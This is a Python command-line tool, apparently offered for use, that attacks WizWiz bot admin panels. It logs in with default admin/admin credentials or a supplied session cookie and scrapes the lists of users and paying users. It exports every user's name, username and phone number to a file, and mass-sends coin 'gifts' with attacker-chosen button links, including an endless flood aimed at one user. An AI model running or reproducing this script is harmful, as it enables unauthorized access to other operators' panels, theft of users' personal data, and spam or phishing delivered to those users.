from collections import UserList
from requests import get, post
from bs4 import BeautifulSoup
from argparse import ArgumentParser
from sys import argv
from random import choice
from string import ascii_lowercase, digits
from threading import Thread
from json import dump
try:
  from colorama import init, Fore
except:
  import sys
  from pip import main
  stdout = sys.stdout
  stderr = sys.stderr
  class ignore:
    def write(self, *a):
      pass
    def flush(self):
      pass
  print('installing library . . .')
  sys.stdout = ignore()
  sys.stderr = ignore()
  main(['install', 'colorama'])
  sys.stdout = stdout
  sys.stderr = stderr
from colorama import init, Fore
init()


parser = ArgumentParser(
                    prog='Fucking WizWiz',
                    description='This code will send your custom gifts to all wizwiz panel users',
                    epilog='Writed By @Py_Sudo')

parser.add_argument('-G', '--gift', action='store_true', help='Active gift mode')
parser.add_argument('-C', '--cookie', help='Your PHPSESSID of panel', metavar=str())
parser.add_argument('-U', '--username', help='Username for login (defualt : admin)', metavar=str(), default='admin')
parser.add_argument('-p', '--password', help='Password for login (defualt : admin)', metavar=str(), default='admin')
parser.add_argument('-u', '--url', help='Panel login address', metavar=str())
parser.add_argument('-co', '--coin', help='How many coin you want to gift?', metavar=str())
parser.add_argument('-bt', '--button-text', help='Button text of gift message', metavar=str())
parser.add_argument('-bu', '--button-url', help='Button url of gift message', metavar=str())
parser.add_argument('--count', help='You want to send your gifts to how many subscribers', metavar=str())
parser.add_argument('-r', '--random', action='store_true', help='Random select')
parser.add_argument('-P', '--pays', action='store_true', help='Select from users that pays')
parser.add_argument('-s', '--start', metavar=str(), help='Starting index')
parser.add_argument('-S', '--stop', metavar=str(), help='Stoping index')
parser.add_argument('-i', '--information', metavar=str(), help='Extract all users information - give a filename')
parser.add_argument('-su', '--special-user', metavar=str(), help='Extract all users information - give a filename', default=None)


def get_users(pays, url, cookie, start_stop):
    start = start_stop['start']
    stop = start_stop['stop']
    if pays is True:
        get_website = get(url+'pays.php', cookies=cookie).text
        html = BeautifulSoup(get_website, features='html5lib')
        users = [i.get_text() for i in html.findAll('p', class_='text-xs text-gray-600 dark:text-gray-400')]
        info = [i.get_text() for i in html.findAll('td', class_='px-4 py-3 text-xs')]
        r_value = list()
        for user, stat in zip(users, info):
            if stat in ('approved', 'تایید شده'):
                r_value.append(user)
        users = list(set(r_value))
        print(Fore.LIGHTGREEN_EX+'[+] '+Fore.CYAN+'i found '+Fore.GREEN+str(len(users))+Fore.CYAN+' users that pay in panel')
    else:
        get_website = get(url+'index.php', cookies=cookie).text
        html = BeautifulSoup(get_website, features='lxml')
        users = [str(i.get_text()) for i in html.findAll('p', class_='text-xs mt-1 text-gray-600 dark:text-gray-400 text-left')]
        print(Fore.LIGHTGREEN_EX+'[+] '+Fore.CYAN+'i found '+Fore.GREEN+str(len(users))+Fore.CYAN+' users in panel')
    if not users:
        exit(Fore.RED+'[-] '+Fore.MAGENTA+'PHPSESSID is invalid')
    if stop:
        print(Fore.LIGHTGREEN_EX+'[+] '+Fore.CYAN+'okay i\'ll send gift to {}-{} indexes'.format(start, stop))
        return users[int(start):int(stop)]
    if start:
      print(Fore.LIGHTGREEN_EX+'[+] '+Fore.CYAN+'okay i start from index {}'.format(Fore.GREEN+start))
      return users[int(start)::]
    return users


def PHPSESSID(login_page, username, password):
  cookie = {'PHPSESSID': ''.join(choice(ascii_lowercase+digits) for _ in range(26))}
  return cookie if post(login_page, cookies=cookie, data={'username': username, 'password': password, 'check_login': 1, 'submit': 'Submit'}).status_code == 200 else False

def extract_numbers(cookie, file_name, url):
  print(Fore.LIGHTGREEN_EX+'[+] '+Fore.CYAN+'Okay i\'ll store all phone numbers in '+Fore.GREEN+file_name)
  page = get(url+'index.php', cookies=cookie).text
  html = BeautifulSoup(page, features='lxml')
  users = html.findAll('tr', class_='text-gray-700 dark:text-gray-400')
  lst = list()
  for i in users:
    phone = BeautifulSoup(str(i), features='lxml')
    td = phone.findAll('td', 'px-4 py-3')
    lst.append({'userid': phone.find('p', class_='text-xs mt-1 text-gray-600 dark:text-gray-400 text-left').get_text(), 'name': phone.find('p', class_='font-semibold text-left').get_text(), 'username': td[1].get_text(), 'phone': td[5].get_text()})
  with open(file_name, 'w') as i:
    dump(lst, i)
  print(Fore.LIGHTGREEN_EX+'[+] '+Fore.CYAN+'information saved in '+Fore.GREEN+file_name)
def send_gift(cookie, coin, text, button_url, url, users, count=None, random=None, special_usr=None):
    print(Fore.WHITE+'Start gift . . !')
    if not special_usr:
      if count and random:
          print(Fore.LIGHTGREEN_EX+'[+] '+Fore.CYAN+'okay i\'ll send gift to '+Fore.GREEN+count+Fore.CYAN+' subscribers randomly')
          user = []
          for _ in range(int(count)):
              R = choice(users)
              user.append(R)
              users.remove(R)
          users = user
      if count and not random:
          print(Fore.LIGHTGREEN_EX+'[+] '+Fore.CYAN+'okay i\'ll send gift to '+Fore.GREEN+count+Fore.CYAN+' subscribers')
          users = [users[i] for i in range(int(count))]

      for index, i in enumerate(users):
          params = {
              'id_user': i,
              'gift': coin,
              'button': text,
              'url': button_url,
              'action': 'insert_gift'
          }
          if post(url+'gift.php', data=params, cookies=cookie).status_code == 200:
              print(Fore.LIGHTGREEN_EX+f'[{index+1}] '+Fore.CYAN+'Sent to '+Fore.GREEN+str(i))
          else:
              print(Fore.RED+'[-] '+Fore.MAGENTA+'A problem occurred and could not be sent to '+Fore.GREEN+str(i))
    else:
      try:
        params = {
            'id_user': special_usr,
            'gift': coin,
            'button': text,
            'url': button_url,
            'action': 'insert_gift'
        }
        n = int()
        while True:
          post(url+'gift.php', data=params, cookies=cookie)
          n += 1
          print(Fore.LIGHTGREEN_EX+f'[{n}] '+Fore.CYAN+'Sent.')
      except KeyboardInterrupt as e:
        print(Fore.LIGHTGREEN_EX+'[+] '+Fore.CYAN++'okay i stop it.')
        exit()

if __name__ == '__main__':
    args = parser.parse_args()
    if len(argv) == 1:
        parser.print_help()
    else:
        url = args.url
        url = url if url[-1] == '/' else url+'/'
        if not 'wizpanel' in url.split('/')[-2] and url.split('/')[-2].endswith('php'):
            url = '/'.join([i for i in url.split('/') if not i.endswith('php')])
            url = url if url[-1] == '/' else url+'/'
        if not args.cookie:
          cookie = PHPSESSID(url+'login.php', args.username, args.password)
          print(Fore.LIGHTGREEN_EX+'[+] '+Fore.CYAN+'Login successfully.\n'+Fore.LIGHTGREEN_EX+'[+] '+Fore.CYAN+'i got the PHPSESSID : '+Fore.LIGHTGREEN_EX+cookie['PHPSESSID'])
        else:
          cookie = {'PHPSESSID': args.cookie}
        start_stop = {'start': args.start, 'stop': args.stop}
        if not args.special_user:
          users = get_users(args.pays, url, cookie, start_stop)
        else:
          users = list()
        if args.information:
          extract_numbers(cookie, args.information, url)
        if args.gift:
          send_gift(cookie, args.coin, args.button_text, args.button_url, url, users, args.count, args.random, args.special_user)
